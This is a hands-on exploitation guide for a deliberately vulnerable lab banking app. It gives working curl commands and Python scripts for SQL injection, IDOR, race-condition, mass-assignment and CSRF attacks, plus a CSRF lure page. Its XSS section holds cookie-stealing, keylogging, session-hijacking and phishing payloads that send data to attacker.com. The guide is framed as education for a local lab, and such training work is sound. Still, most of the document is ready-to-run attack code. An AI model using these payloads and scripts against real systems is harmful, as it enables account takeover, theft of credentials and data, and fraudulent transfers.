# SecureBank Exploitation Guide

Step-by-step practical guide to exploiting vulnerabilities in SecureBank Red Team for educational purposes.

---

## Table of Contents

1. [Introduction](#introduction)
2. [Lab Setup](#lab-setup)
3. [SQL Injection Exploitation](#sql-injection-exploitation)
4. [IDOR Exploitation](#idor-exploitation)
5. [Race Condition Exploitation](#race-condition-exploitation)
6. [XSS Exploitation](#xss-exploitation)
7. [Mass Assignment Exploitation](#mass-assignment-exploitation)
8. [CSRF Exploitation](#csrf-exploitation)
9. [Tool Usage](#tool-usage)
10. [Chaining Attacks](#chaining-attacks)

---

## Introduction

### Purpose

This guide provides hands-on instructions for exploiting the vulnerabilities in SecureBank Red Team. These techniques are for **educational purposes only** and should never be used against systems you don't own or have explicit permission to test.

### Prerequisites

Before starting:
- ✅ Red Team API running on port 5001
- ✅ Frontend accessible
- ✅ Basic understanding of HTTP requests
- ✅ Familiarity with browser developer tools
- ✅ Test account credentials

### Tools You'll Use

- **Browser Developer Tools** (F12)
- **curl** - Command-line HTTP client
- **Python** - For automation scripts
- **Burp Suite** - Interception proxy
- **SQLMap** - SQL injection tool
- **Postman** - API testing

### Legal and Ethical Notice

⚠️ **Warning**: 
- Only test against your own SecureBank installation
- Never use these techniques against production systems
- Always obtain written permission before testing
- Unauthorized access is illegal in most jurisdictions

---

## Lab Setup

### Environment Verification

Before starting exploitation, verify your environment:

```bash
# 1. Check Red Team API
curl http://localhost:5001/api/health
# Expected: {"status":"healthy","team":"red"}

# 2. Check database exists
ls -l backend/securebank/securebank.db

# 3. Verify test accounts
python3 << EOF
import sqlite3
conn = sqlite3.connect('backend/securebank/securebank.db')
cursor = conn.cursor()
cursor.execute("SELECT username, account_id FROM users")
print(cursor.fetchall())
EOF
```

### Creating Test Environment

```bash
# Reset database to clean state
cd backend/securebank
rm securebank.db
python init_db.py

# Start Red Team API
python securebank_red.py &

# Note the PID for later
echo $! > red_team.pid
```

### Setting Up Attack Workspace

```bash
# Create exploitation directory
mkdir ~/securebank_exploitation
cd ~/securebank_exploitation

# Create subdirectories
mkdir -p {sql_injection,idor,race_condition,xss,mass_assignment,csrf}
mkdir -p tools scripts reports
```

---

## SQL Injection Exploitation

### Manual SQL Injection

#### Step 1: Identify Injection Point

**Test the login endpoint:**

```bash
# Normal login (should succeed)
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}'

# Response: {"success":true,"user_id":1,...}
```

#### Step 2: Test for SQL Injection

```bash
# Test with single quote
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice'\''","password":"anything"}'

# If you see SQL error or different behavior = VULNERABLE
```

#### Step 3: Authentication Bypass

```bash
# Bypass using OR condition
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice'\'' OR '\''1'\''='\''1","password":"anything"}'

# Success! You're logged in without knowing the password
```

**Why this works:**
```sql
-- Original query
SELECT * FROM users WHERE username='alice' OR '1'='1' AND password='anything'

-- The OR '1'='1' is always true, bypassing authentication
```

#### Step 4: Extract Database Information

```bash
# Get database version
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' UNION SELECT sqlite_version(),NULL,NULL,NULL,NULL --","password":"x"}'

# Get table names
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' UNION SELECT name,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='\''table'\'' --","password":"x"}'
```

#### Step 5: Extract User Data

```bash
# Get all usernames and passwords
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' UNION SELECT username,password,NULL,NULL,NULL FROM users --","password":"x"}'

# Get all account balances
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' UNION SELECT account_id,balance,NULL,NULL,NULL FROM accounts --","password":"x"}'
```

#### Step 6: Modify Data (Dangerous!)

```bash
# Update balance (execute as separate statement)
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice'\'' ; UPDATE accounts SET balance=999999 WHERE account_id=1001 --","password":"x"}'
```

### Automated SQL Injection with Python

Create `sql_injection_exploit.py`:

```python
#!/usr/bin/env python3
import requests
import json

API_URL = "http://localhost:5001/api/login"

def test_sql_injection():
    """Test for SQL injection vulnerability"""
    
    # Test payloads
    payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin' --",
        "' OR 'a'='a",
        "' UNION SELECT NULL--",
    ]
    
    for payload in payloads:
        data = {
            "username": payload,
            "password": "anything"
        }
        
        try:
            response = requests.post(API_URL, json=data)
            print(f"[+] Payload: {payload}")
            print(f"[+] Status: {response.status_code}")
            print(f"[+] Response: {response.text}")
            
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    print("[!] VULNERABLE! Bypassed authentication")
                    print(f"[!] Logged in as user_id: {result.get('user_id')}")
            print("-" * 50)
        
        except Exception as e:
            print(f"[-] Error: {e}")

def extract_data():
    """Extract sensitive data using UNION injection"""
    
    # Extract usernames and passwords
    payload = "' UNION SELECT user_id,username,password,email,NULL FROM users --"
    
    data = {
        "username": payload,
        "password": "x"
    }
    
    try:
        response = requests.post(API_URL, json=data)
        print("[+] Extracting user data...")
        print(response.text)
    except Exception as e:
        print(f"[-] Error: {e}")

def modify_balance():
    """Modify account balance"""
    
    payload = "alice'; UPDATE accounts SET balance=999999 WHERE account_id=1001 --"
    
    data = {
        "username": payload,
        "password": "x"
    }
    
    try:
        response = requests.post(API_URL, json=data)
        print("[+] Attempting balance modification...")
        print(response.text)
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    print("=== SQL Injection Exploitation ===\n")
    print("1. Testing for vulnerability...")
    test_sql_injection()
    
    print("\n2. Extracting data...")
    extract_data()
    
    print("\n3. Modifying data...")
    modify_balance()
```

Run the exploit:
```bash
python3 sql_injection_exploit.py
```

### Using SQLMap

```bash
# Basic scan
sqlmap -u "http://localhost:5001/api/login" \
       --data='{"username":"alice","password":"alice123"}' \
       --method=POST \
       --headers="Content-Type: application/json" \
       --level=5 \
       --risk=3

# Dump all databases
sqlmap -u "http://localhost:5001/api/login" \
       --data='{"username":"alice","password":"alice123"}' \
       --method=POST \
       --dbs

# Dump specific table
sqlmap -u "http://localhost:5001/api/login" \
       --data='{"username":"alice","password":"alice123"}' \
       --method=POST \
       -D securebank \
       -T users \
       --dump
```

### Using Burp Suite

1. **Configure Proxy**:
   - Open Burp Suite
   - Go to Proxy > Options
   - Ensure proxy is on 127.0.0.1:8080

2. **Configure Browser**:
   - Set browser proxy to 127.0.0.1:8080
   - Visit http://localhost:8000

3. **Intercept Login**:
   - Turn on Intercept
   - Attempt login
   - Capture POST request to /api/login

4. **Test Injection**:
   - Right-click request > Send to Repeater
   - Modify username parameter
   - Test different payloads

5. **Use Scanner**:
   - Right-click request > Scan
   - Review findings

---

## IDOR Exploitation

### Manual IDOR Testing

#### Step 1: Login and Get Session

```bash
# Login as Alice
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  -c cookies.txt

# Save session cookie for subsequent requests
```

#### Step 2: Access Your Own Account

```bash
# View Alice's account (account_id = 1001)
curl http://localhost:5001/api/account/1001 \
  -b cookies.txt

# Response: Alice's account details
```

#### Step 3: Test IDOR

```bash
# Try to access Bob's account (account_id = 1002)
curl http://localhost:5001/api/account/1002 \
  -b cookies.txt

# If successful = IDOR VULNERABILITY
# You're seeing Bob's data without authorization!
```

#### Step 4: Enumerate All Accounts

```bash
# Create enumeration script
for i in {1000..1010}; do
    echo "Testing account $i..."
    curl -s http://localhost:5001/api/account/$i \
         -b cookies.txt | jq .
done
```

#### Step 5: Access Transactions

```bash
# View Bob's transactions (unauthorized)
curl http://localhost:5001/api/transactions?account_id=1002 \
  -b cookies.txt

# Enumerate all transactions
for i in {1000..1010}; do
    curl -s "http://localhost:5001/api/transactions?account_id=$i" \
         -b cookies.txt >> all_transactions.json
done
```

### Automated IDOR Scanner

Create `idor_exploit.py`:

```python
#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://localhost:5001"

def login(username, password):
    """Login and return session"""
    session = requests.Session()
    
    response = session.post(
        f"{BASE_URL}/api/login",
        json={"username": username, "password": password}
    )
    
    if response.json().get('success'):
        print(f"[+] Logged in as {username}")
        return session
    else:
        print(f"[-] Login failed for {username}")
        return None

def test_idor_accounts(session, start=1000, end=1010):
    """Test IDOR on account endpoint"""
    
    print(f"\n[+] Testing IDOR on accounts {start}-{end}")
    vulnerable_accounts = []
    
    for account_id in range(start, end + 1):
        response = session.get(f"{BASE_URL}/api/account/{account_id}")
        
        if response.status_code == 200:
            data = response.json()
            if 'balance' in data:
                print(f"[!] IDOR FOUND: Account {account_id}")
                print(f"    Balance: ${data['balance']}")
                vulnerable_accounts.append(data)
        
    return vulnerable_accounts

def test_idor_transactions(session):
    """Test IDOR on transaction endpoint"""
    
    print("\n[+] Testing IDOR on transactions")
    
    for account_id in range(1000, 1010):
        response = session.get(
            f"{BASE_URL}/api/transactions",
            params={"account_id": account_id}
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get('transactions'):
                print(f"[!] IDOR FOUND: Transactions for account {account_id}")
                print(f"    Count: {len(data['transactions'])}")

def exploit_idor():
    """Full IDOR exploitation"""
    
    # Login as Alice
    session = login("alice", "alice123")
    if not session:
        return
    
    # Test account access
    accounts = test_idor_accounts(session)
    
    # Test transaction access
    test_idor_transactions(session)
    
    # Save results
    with open('idor_results.json', 'w') as f:
        json.dump(accounts, f, indent=2)
    
    print(f"\n[+] Found {len(accounts)} accessible accounts")
    print("[+] Results saved to idor_results.json")

if __name__ == "__main__":
    print("=== IDOR Exploitation ===\n")
    exploit_idor()
```

Run the exploit:
```bash
python3 idor_exploit.py
```

---

## Race Condition Exploitation

### Manual Race Condition Testing

#### Step 1: Check Initial Balance

```bash
# Login and check balance
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  -c cookies.txt

curl http://localhost:5001/api/account/1001 -b cookies.txt
# Note the balance (e.g., $5000)
```

#### Step 2: Create Test Transfer

```bash
# Test single transfer
curl -X POST http://localhost:5001/api/transfer \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "from_account": 1001,
    "to_account": 1002,
    "amount": 500
  }'
```

#### Step 3: Exploit Race Condition

```bash
# Send 5 simultaneous requests
for i in {1..5}; do
    curl -X POST http://localhost:5001/api/transfer \
      -H "Content-Type: application/json" \
      -b cookies.txt \
      -d '{
        "from_account": 1001,
        "to_account": 1002,
        "amount": 500
      }' &
done
wait

# Check balance
curl http://localhost:5001/api/account/1001 -b cookies.txt

# If balance is not $2500 (5000 - 500*5), race condition exists!
```

### Advanced Race Condition Exploit

Create `race_condition_exploit.py`:

```python
#!/usr/bin/env python3
import requests
import threading
import time
import json

BASE_URL = "http://localhost:5001"

class RaceConditionExploit:
    def __init__(self, username, password):
        self.session = requests.Session()
        self.login(username, password)
        self.results = []
        
    def login(self, username, password):
        """Login to get session"""
        response = self.session.post(
            f"{BASE_URL}/api/login",
            json={"username": username, "password": password}
        )
        
        if response.json().get('success'):
            print(f"[+] Logged in as {username}")
        else:
            raise Exception("Login failed")
    
    def get_balance(self, account_id):
        """Get current balance"""
        response = self.session.get(f"{BASE_URL}/api/account/{account_id}")
        return response.json().get('balance', 0)
    
    def transfer(self, from_account, to_account, amount):
        """Execute transfer"""
        try:
            response = self.session.post(
                f"{BASE_URL}/api/transfer",
                json={
                    "from_account": from_account,
                    "to_account": to_account,
                    "amount": amount
                }
            )
            self.results.append(response.json())
        except Exception as e:
            self.results.append({"error": str(e)})
    
    def exploit(self, from_account, to_account, amount, threads=10):
        """Exploit race condition"""
        
        print(f"\n[+] Starting race condition exploit")
        print(f"[+] From account: {from_account}")
        print(f"[+] To account: {to_account}")
        print(f"[+] Amount per transfer: ${amount}")
        print(f"[+] Number of threads: {threads}")
        
        # Get initial balance
        initial_balance = self.get_balance(from_account)
        print(f"[+] Initial balance: ${initial_balance}")
        
        # Expected final balance
        expected_balance = initial_balance - (amount * threads)
        print(f"[+] Expected final balance: ${expected_balance}")
        
        # Create threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(
                target=self.transfer,
                args=(from_account, to_account, amount)
            )
            thread_list.append(t)
        
        # Start all threads simultaneously
        print(f"\n[+] Launching {threads} simultaneous requests...")
        start_time = time.time()
        
        for t in thread_list:
            t.start()
        
        # Wait for completion
        for t in thread_list:
            t.join()
        
        elapsed = time.time() - start_time
        print(f"[+] All requests completed in {elapsed:.2f} seconds")
        
        # Check final balance
        time.sleep(1)  # Wait for DB to settle
        final_balance = self.get_balance(from_account)
        print(f"\n[+] Final balance: ${final_balance}")
        print(f"[+] Expected: ${expected_balance}")
        
        # Calculate difference
        difference = final_balance - expected_balance
        
        if difference > 0:
            print(f"\n[!] RACE CONDITION EXPLOITED!")
            print(f"[!] You gained ${difference}!")
            print(f"[!] Successful requests: {len([r for r in self.results if r.get('success')])}")
        else:
            print(f"\n[-] Race condition not exploited")
            print(f"[-] Balance decreased correctly")
        
        # Show results
        success_count = len([r for r in self.results if r.get('success')])
        print(f"\n[+] Results summary:")
        print(f"    Total requests: {threads}")
        print(f"    Successful: {success_count}")
        print(f"    Failed: {threads - success_count}")

def main():
    print("=== Race Condition Exploitation ===\n")
    
    # Create exploit instance
    exploit = RaceConditionExploit("alice", "alice123")
    
    # Run exploit
    # Transfer $500, 10 times simultaneously
    # Should only deduct $500 once if race condition exists
    exploit.exploit(
        from_account=1001,
        to_account=1002,
        amount=500,
        threads=10
    )

if __name__ == "__main__":
    main()
```

Run the exploit:
```bash
python3 race_condition_exploit.py
```

### Using Burp Suite Intruder

1. **Capture Transfer Request**:
   - Intercept a transfer request in Burp
   - Right-click > Send to Intruder

2. **Configure Intruder**:
   - Go to Intruder tab
   - Clear all payload positions
   - Set attack type to "Sniper"

3. **Configure Payloads**:
   - Payload type: Numbers
   - From: 1, To: 10, Step: 1

4. **Configure Options**:
   - Go to Options tab
   - Set thread count to 10
   - Remove delays

5. **Launch Attack**:
   - Click "Start attack"
   - Monitor responses
   - Check if all succeeded despite insufficient balance

---

## XSS Exploitation

### Stored XSS Testing

#### Step 1: Identify Input Points

```bash
# Test profile update endpoint
curl -X PUT http://localhost:5001/api/profile \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "full_name": "Alice Johnson",
    "email": "alice@example.com"
  }'
```

#### Step 2: Test Basic XSS

```bash
# Inject basic alert
curl -X PUT http://localhost:5001/api/profile \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "full_name": "<script>alert(\"XSS\")</script>",
    "email": "alice@example.com"
  }'

# Now view profile in browser - alert should fire
```

#### Step 3: Cookie Stealing

```bash
# Inject cookie stealer
curl -X PUT http://localhost:5001/api/profile \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "full_name": "<script>fetch(\"http://attacker.com?cookie=\"+document.cookie)</script>",
    "email": "alice@example.com"
  }'
```

### XSS Payload Collection

Create `xss_payloads.txt`:

```html
<!-- Basic alerts -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Cookie stealing -->
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">

<!-- Keylogging -->
<script>
document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/log?key='+e.key);
});
</script>

<!-- Session hijacking -->
<script>
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        cookie: document.cookie,
        localStorage: localStorage,
        sessionStorage: sessionStorage
    })
});
</script>

<!-- Phishing -->
<script>
document.body.innerHTML = '<h1>Session Expired</h1><form action="http://attacker.com/phish"><input name="password" placeholder="Re-enter password"><button>Submit</button></form>';
</script>

<!-- Redirect -->
<script>window.location='http://attacker.com/malware';</script>

<!-- DOM manipulation -->
<script>
document.getElementById('balance').innerHTML = '$0.00';
</script>
```

### Automated XSS Testing

Create `xss_exploit.py`:

```python
#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://localhost:5001"

class XSSExploit:
    def __init__(self, username, password):
        self.session = requests.Session()
        self.login(username, password)
        
    def login(self, username, password):
        """Login to get session"""
        response = self.session.post(
            f"{BASE_URL}/api/login",
            json={"username": username, "password": password}
        )
        
        if response.json().get('success'):
            print(f"[+] Logged in as {username}")
        else:
            raise Exception("Login failed")
    
    def test_xss_profile(self, payload):
        """Test XSS in profile fields"""
        
        print(f"\n[+] Testing payload: {payload[:50]}...")
        
        response = self.session.put(
            f"{BASE_URL}/api/profile",
            json={
                "full_name": payload,
                "email": "test@example.com"
            }
        )
        
        if response.status_code == 200:
            print(f"[+] Payload accepted!")
            
            # Verify it's stored
            profile_response = self.session.get(f"{BASE_URL}/api/profile")
            profile = profile_response.json()
            
            if payload in str(profile):
                print(f"[!] XSS VULNERABILITY CONFIRMED!")
                print(f"[!] Payload stored in database")
                return True
        
        return False
    
    def run_tests(self):
        """Run all XSS tests"""
        
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            '<iframe src="javascript:alert(\'XSS\')">',
        ]
        
        vulnerable = []
        
        for payload in payloads:
            if self.test_xss_profile(payload):
                vulnerable.append(payload)
        
        print(f"\n[+] Testing complete")
        print(f"[+] Vulnerable payloads: {len(vulnerable)}/{len(payloads)}")
        
        return vulnerable

def main():
    print("=== XSS Exploitation ===\n")
    
    exploit = XSSExploit("alice", "alice123")
    vulnerable = exploit.run_tests()
    
    if vulnerable:
        print("\n[!] APPLICATION IS VULNERABLE TO XSS")
        print("[!] These payloads work:")
        for payload in vulnerable:
            print(f"    - {payload}")

if __name__ == "__main__":
    main()
```

---

## Mass Assignment Exploitation

### Testing Mass Assignment

#### Step 1: Normal Profile Update

```bash
# Update allowed fields
curl -X PUT http://localhost:5001/api/profile \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "email": "alice@newmail.com",
    "phone": "555-1234"
  }'
```

#### Step 2: Test Extra Parameters

```bash
# Try to modify balance
curl -X PUT http://localhost:5001/api/profile \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "email": "alice@newmail.com",
    "balance": 999999
  }'

# Check if balance changed
curl http://localhost:5001/api/account/1001 -b cookies.txt
```

#### Step 3: Test Privilege Escalation

```bash
# Try to become admin
curl -X PUT http://localhost:5001/api/profile \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "email": "alice@newmail.com",
    "is_admin": true,
    "role": "admin",
    "account_type": "premium"
  }'
```

### Automated Mass Assignment Testing

Create `mass_assignment_exploit.py`:

```python
#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://localhost:5001"

class MassAssignmentExploit:
    def __init__(self, username, password):
        self.session = requests.Session()
        self.login(username, password)
        
    def login(self, username, password):
        """Login to get session"""
        response = self.session.post(
            f"{BASE_URL}/api/login",
            json={"username": username, "password": password}
        )
        
        if response.json().get('success'):
            print(f"[+] Logged in as {username}")
            return True
        return False
    
    def get_account(self, account_id):
        """Get account details"""
        response = self.session.get(f"{BASE_URL}/api/account/{account_id}")
        return response.json()
    
    def test_field(self, field_name, field_value, account_id=1001):
        """Test if field can be modified"""
        
        print(f"\n[+] Testing field: {field_name} = {field_value}")
        
        # Get initial value
        initial = self.get_account(account_id)
        
        # Try to update
        response = self.session.put(
            f"{BASE_URL}/api/profile",
            json={
                "email": "test@example.com",
                field_name: field_value
            }
        )
        
        if response.status_code == 200:
            # Check if it changed
            updated = self.get_account(account_id)
            
            if updated.get(field_name) == field_value:
                print(f"[!] VULNERABLE! Field '{field_name}' was modified!")
                print(f"    Before: {initial.get(field_name)}")
                print(f"    After: {updated.get(field_name)}")
                return True
            else:
                print(f"[-] Field '{field_name}' not modified")
        
        return False
    
    def exploit(self):
        """Test common fields"""
        
        print("=== Testing Mass Assignment ===\n")
        
        vulnerable_fields = []
        
        test_fields = {
            'balance': 999999,
            'is_admin': True,
            'role': 'admin',
            'account_type': 'premium',
            'credit_limit': 1000000,
            'verified': True,
            'status': 'premium'
        }
        
        for field, value in test_fields.items():
            if self.test_field(field, value):
                vulnerable_fields.append(field)
        
        print(f"\n[+] Testing complete")
        print(f"[+] Vulnerable fields: {len(vulnerable_fields)}")
        
        if vulnerable_fields:
            print("\n[!] MASS ASSIGNMENT VULNERABILITY CONFIRMED")
            print("[!] These fields can be modified:")
            for field in vulnerable_fields:
                print(f"    - {field}")

def main():
    exploit = MassAssignmentExploit("alice", "alice123")
    exploit.exploit()

if __name__ == "__main__":
    main()
```

---

## CSRF Exploitation

### Creating CSRF Attack Page

Create `csrf_attack.html`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Free Money!</title>
</head>
<body>
    <h1>Congratulations! You've won $1000!</h1>
    <p>Click the button below to claim your prize!</p>
    <button onclick="claimPrize()">Claim Prize</button>
    
    <script>
        function claimPrize() {
            // CSRF attack - transfer money
            fetch('http://localhost:5001/api/transfer', {
                method: 'POST',
                credentials: 'include',  // Include cookies
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    from_account: 1001,  // Victim's account
                    to_account: 9999,     // Attacker's account
                    amount: 1000
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('Prize claimed! Check your account.');
                } else {
                    alert('Sorry, there was an error.');
                }
            });
        }
        
        // Auto-execute on page load
        window.onload = function() {
            // Uncomment to auto-execute
            // claimPrize();
        };
    </script>
</body>
</html>
```

### Testing CSRF

#### Step 1: Setup Attack Server

```bash
# Create simple HTTP server for attack page
cd ~/securebank_exploitation/csrf
python3 -m http.server 9000
```

#### Step 2: Execute Attack

1. Login to SecureBank at http://localhost:8000
2. Keep the session active
3. Visit http://localhost:9000/csrf_attack.html
4. Click "Claim Prize"
5. Check if transfer executed

#### Step 3: Verify

```bash
# Check if balance changed
curl http://localhost:5001/api/account/1001 -b cookies.txt
```

---

## Tool Usage

### Burp Suite Complete Workflow

See TESTING_WITH_BURP.md for detailed Burp Suite guide.

### SQLMap Complete Workflow

See TESTING_WITH_SQLMAP.md for detailed SQLMap guide.

### OWASP ZAP Complete Workflow

See TESTING_WITH_ZAP.md for detailed ZAP guide.

---

## Chaining Attacks

### Attack Chain 1: SQL Injection + IDOR

```python
# 1. Use SQL injection to get all user IDs
# 2. Use IDOR to access each user's data

import requests

# SQL injection to get users
response = requests.post(
    'http://localhost:5001/api/login',
    json={
        'username': "' UNION SELECT user_id,NULL,NULL,NULL,NULL FROM users --",
        'password': 'x'
    }
)

# Extract user IDs
user_ids = extract_user_ids(response.json())

# Use IDOR to access each account
for user_id in user_ids:
    account_data = requests.get(f'http://localhost:5001/api/account/{user_id}')
    print(account_data.json())
```

### Attack Chain 2: XSS + CSRF

```html
<!-- Inject XSS that performs CSRF -->
<script>
// Stored XSS payload that executes CSRF attack
fetch('http://localhost:5001/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        from_account: 1001,
        to_account: 9999,
        amount: 5000
    })
});
</script>
```

### Attack Chain 3: IDOR + Mass Assignment

```bash
# 1. Use IDOR to find other accounts
# 2. Use mass assignment to modify them

# Enumerate accounts
for i in {1000..1010}; do
    # Try to modify each account
    curl -X PUT http://localhost:5001/api/account/$i \
        -H "Content-Type: application/json" \
        -b cookies.txt \
        -d '{"balance": 0, "status": "closed"}'
done
```

---

## Responsible Disclosure

If you find vulnerabilities in real applications:

1. **Do Not Exploit**: Only verify the vulnerability exists
2. **Document**: Take notes and screenshots
3. **Report**: Contact security team or bug bounty program
4. **Wait**: Give time for fix before public disclosure
5. **Coordinate**: Work with vendor on disclosure timeline

---

## Legal Disclaimer

**This guide is for educational purposes only.** Unauthorized access to computer systems is illegal. Always:

- Only test systems you own
- Get written permission before testing
- Follow responsible disclosure practices
- Respect bug bounty program rules
- Comply with local laws

---

*Test responsibly. Learn continuously. Secure everything.*

*Last Updated: 2024*
